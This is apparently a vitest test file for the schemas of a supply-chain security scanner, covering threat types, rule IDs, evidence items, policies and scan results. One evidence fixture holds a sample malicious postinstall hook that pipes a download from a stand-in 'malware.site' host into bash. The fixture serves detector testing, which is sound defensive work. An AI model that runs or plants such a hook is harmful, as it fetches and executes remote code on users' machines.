import { describe, expect, it } from 'vitest';
import {
  ConfigSchema,
  FindingCategorySchema,
  NormalizedFindingSchema,
  PreInstallGateResultSchema,
  ScReachabilitySchema,
  SupplyChainCapabilitiesSchema,
  SupplyChainEvidenceItemSchema,
  SupplyChainPolicySchema,
  SupplyChainRuleIdSchema,
  SupplyChainScanResultSchema,
  SupplyChainThreatTypeSchema,
  SuppressionReasonCodeSchema,
} from '../src/index.js';

describe('Supply Chain Contracts & Schemas (WP1)', () => {
  it('validates all 15 SupplyChainThreatType enum values', () => {
    const expectedThreatTypes = [
      'INSTALL_SCRIPT',
      'CAPABILITY_VIOLATION',
      'TYPOSQUAT',
      'BIDI_TROJAN',
      'HIGH_ENTROPY',
      'CHRONO_ANOMALY',
      'AI_HALLUCINATION',
      'SEMVER_ANOMALY',
      'MANIFEST_CONFUSION',
      'GOVERNANCE_RISK',
      'EMPTY_OR_MISSING_TARBALL',
      'BIN_CONFUSION',
      'SHELL_OVERRIDE',
      'OBFUSCATION',
      'PROTESTWARE',
    ];

    expect(SupplyChainThreatTypeSchema.options).toHaveLength(15);
    for (const type of expectedThreatTypes) {
      expect(SupplyChainThreatTypeSchema.parse(type)).toBe(type);
    }
    expect(() => SupplyChainThreatTypeSchema.parse('INVALID_THREAT')).toThrow();
  });

  it('validates all 36 SupplyChainRuleId enum values', () => {
    const expectedRuleIds = [
      'SC-INSTALL-001',
      'SC-INSTALL-002',
      'SC-INSTALL-003',
      'SC-BIN-001',
      'SC-BIN-002',
      'SC-CAP-001',
      'SC-CAP-002',
      'SC-CAP-003',
      'SC-CAP-004',
      'SC-CAP-005',
      'SC-CAP-006',
      'SC-CAP-007',
      'SC-CAP-100',
      'SC-CAP-101',
      'SC-CAP-102',
      'SC-CAP-103',
      'SC-CAP-104',
      'SC-CAP-105',
      'SC-CAP-106',
      'SC-TYPO-001',
      'SC-TYPO-002',
      'SC-TYPO-003',
      'SC-HALL-001',
      'SC-PKG-001',
      'SC-PKG-002',
      'SC-UNI-001',
      'SC-UNI-002',
      'SC-UNI-003',
      'SC-OBF-001',
      'SC-OBF-002',
      'SC-META-001',
      'SC-META-002',
      'SC-META-003',
      'SC-GOV-001',
      'SC-GOV-002',
      'SC-GOV-003',
    ];

    expect(SupplyChainRuleIdSchema.options).toHaveLength(36);
    expect(expectedRuleIds).toHaveLength(36);
    for (const ruleId of expectedRuleIds) {
      expect(SupplyChainRuleIdSchema.parse(ruleId)).toBe(ruleId);
    }
    expect(() => SupplyChainRuleIdSchema.parse('SC-UNKNOWN-999')).toThrow();
  });

  it('validates SupplyChainEvidenceItemSchema', () => {
    const valid = {
      file: 'package.json',
      startLine: 12,
      startCol: 4,
      endLine: 12,
      endCol: 40,
      snippetSha256: 'a'.repeat(64),
      redactedSnippet: '"postinstall": "curl http://malware.site/p | bash"',
      note: 'Remote fetch execution detected',
    };

    const parsed = SupplyChainEvidenceItemSchema.parse(valid);
    expect(parsed.snippetSha256).toBe('a'.repeat(64));

    // Invalid sha256 length
    expect(() =>
      SupplyChainEvidenceItemSchema.parse({
        ...valid,
        snippetSha256: 'short-sha',
      })
    ).toThrow();

    // Invalid negative line
    expect(() =>
      SupplyChainEvidenceItemSchema.parse({
        ...valid,
        startLine: -1,
      })
    ).toThrow();
  });

  it('validates SupplyChainCapabilitiesSchema defaults and custom settings', () => {
    const empty = SupplyChainCapabilitiesSchema.parse({});
    expect(empty.hasShell).toBe(false);
    expect(empty.hasNetwork).toBe(false);
    expect(empty.hasEnvAccess).toBe(false);
    expect(empty.hasFsSensitive).toBe(false);
    expect(empty.hasEval).toBe(false);
    expect(empty.hasDynamicRequire).toBe(false);
    expect(empty.hasInstallScript).toBe(false);
    expect(empty.hasDebugInternals).toBe(false);

    const active = SupplyChainCapabilitiesSchema.parse({
      hasShell: true,
      hasNetwork: true,
    });
    expect(active.hasShell).toBe(true);
    expect(active.hasNetwork).toBe(true);
    expect(active.hasEval).toBe(false);
  });

  it('validates ScReachabilitySchema enum values', () => {
    const valid = ['REACHABLE', 'DEP_REACHABLE_ONLY', 'NOT_REACHABLE', 'NOT_APPLICABLE', 'UNKNOWN'];
    for (const v of valid) {
      expect(ScReachabilitySchema.parse(v)).toBe(v);
    }
    expect(() => ScReachabilitySchema.parse('REACHABLE_CALL_PATH')).toThrow();
  });

  it('validates SupplyChainPolicySchema defaults and allowlist validation', () => {
    const policy = SupplyChainPolicySchema.parse({});
    expect(policy.enabled).toBe(false);
    expect(policy.provider).toBe('null');
    expect(policy.concurrency).toBe(8);
    expect(policy.typosquat.minScore).toBe(0.82);
    expect(policy.entropy.threshold).toBe(4.5);
    expect(policy.failOnSeverity).toBe('HIGH');

    // Valid allowlist entry
    const policyWithAllowlist = SupplyChainPolicySchema.parse({
      allowlist: [
        {
          packageName: 'esbuild',
          versionRange: '>=0.19.0',
          reason: 'Audited build platform install script',
          expires: '2027-01-01T00:00:00Z',
        },
      ],
    });
    expect(policyWithAllowlist.allowlist).toHaveLength(1);

    // Too short reason (< 10 chars)
    expect(() =>
      SupplyChainPolicySchema.parse({
        allowlist: [
          {
            packageName: 'esbuild',
            versionRange: '*',
            reason: 'short',
            expires: '2027-01-01T00:00:00Z',
          },
        ],
      })
    ).toThrow();
  });

  it('validates SupplyChainScanResultSchema round-trip', () => {
    const finding = {
      id: 'sc-finding-1',
      fingerprint: 'b'.repeat(64),
      ruleId: 'SC-INSTALL-001',
      scannerName: 'generic' as const,
      category: 'SUPPLY_CHAIN' as const,
      severity: 'MEDIUM' as const,
      confidence: 'HIGH' as const,
      reachability: 'UNKNOWN' as const,
      location: {
        filePath: 'node_modules/bad-pkg/package.json',
        startLine: 5,
        endLine: 5,
      },
      title: 'Install Script Present',
      description: 'package.json defines a postinstall script hook',
      evidence: [
        {
          scannerName: 'generic' as const,
          scannerRuleId: 'SC-INSTALL-001',
          message: 'postinstall hook present',
        },
      ],
      createdAt: '2026-10-21T00:00:00.000Z',
    };

    const result = {
      findings: [finding],
      diagnostics: [
        {
          level: 'INFO' as const,
          packageName: 'bad-pkg',
          message: 'Analyzed 1 package',
        },
      ],
      stats: {
        packagesAnalyzed: 1,
        packagesSkipped: 0,
        filesScanned: 3,
        bytesScanned: 1024,
        durationMs: 45,
        detectorDurations: {
          InstallScript: 5,
        },
      },
      policyHash: 'c'.repeat(64),
      engineVersion: '0.1.0',
    };

    const parsed = SupplyChainScanResultSchema.parse(result);
    expect(parsed.findings).toHaveLength(1);
    expect(parsed.findings[0]!.category).toBe('SUPPLY_CHAIN');

    const jsonRoundTrip = SupplyChainScanResultSchema.parse(JSON.parse(JSON.stringify(parsed)));
    expect(jsonRoundTrip.policyHash).toBe(result.policyHash);
  });

  it('ensures FindingCategorySchema and NormalizedFindingSchema support SUPPLY_CHAIN alongside legacy categories', () => {
    expect(FindingCategorySchema.options).toContain('SAST');
    expect(FindingCategorySchema.options).toContain('SCA');
    expect(FindingCategorySchema.options).toContain('SECRET');
    expect(FindingCategorySchema.options).toContain('IAC');
    expect(FindingCategorySchema.options).toContain('SUPPLY_CHAIN');

    const legacySastFinding = {
      id: 'legacy-1',
      fingerprint: 'd'.repeat(64),
      ruleId: 'semgrep-sqli',
      scannerName: 'semgrep' as const,
      category: 'SAST' as const,
      severity: 'HIGH' as const,
      confidence: 'HIGH' as const,
      location: {
        filePath: 'src/db.ts',
        startLine: 10,
        endLine: 10,
      },
      title: 'SQL Injection',
      description: 'User input concatenation in SQL query',
      evidence: [
        {
          scannerName: 'semgrep' as const,
          scannerRuleId: 'semgrep-sqli',
          message: 'SQL injection detected',
        },
      ],
      createdAt: '2026-10-21T00:00:00.000Z',
    };

    expect(NormalizedFindingSchema.parse(legacySastFinding).category).toBe('SAST');
  });

  it('ensures SuppressionReasonCodeSchema includes SUPPLY_CHAIN_ALLOWLISTED', () => {
    expect(SuppressionReasonCodeSchema.options).toContain('SUPPLY_CHAIN_ALLOWLISTED');
    expect(SuppressionReasonCodeSchema.parse('SUPPLY_CHAIN_ALLOWLISTED')).toBe(
      'SUPPLY_CHAIN_ALLOWLISTED'
    );
  });

  it('ensures ConfigSchema accepts optional supplyChain configuration block', () => {
    const configWithout = ConfigSchema.parse({});
    expect(configWithout.supplyChain).toBeUndefined();

    const configWith = ConfigSchema.parse({
      supplyChain: {
        enabled: true,
        concurrency: 4,
      },
    });
    expect(configWith.supplyChain?.enabled).toBe(true);
    expect(configWith.supplyChain?.concurrency).toBe(4);
  });

  it('validates PreInstallGateResultSchema and ScaFixReportSchema integration', () => {
    const validGateResult = PreInstallGateResultSchema.parse({
      passed: false,
      violations: [
        {
          ruleId: 'SC-INSTALL-001',
          threatType: 'INSTALL_SCRIPT',
          message: 'Target version introduces new install script',
          severity: 'HIGH',
          blocking: true,
        },
      ],
      targetVersionFacts: {
        hasInstallScripts: true,
        chronoAnomaly: false,
        semverAnomaly: false,
        manifestConfusion: false,
        hasBidiOrInvisibleUnicode: false,
        hasTyposquatOrHallucination: false,
        blockingFindingsCount: 1,
      },
      safeCandidateVersion: '1.2.3',
    });

    expect(validGateResult.passed).toBe(false);
    expect(validGateResult.violations).toHaveLength(1);
    expect(validGateResult.safeCandidateVersion).toBe('1.2.3');
  });
});
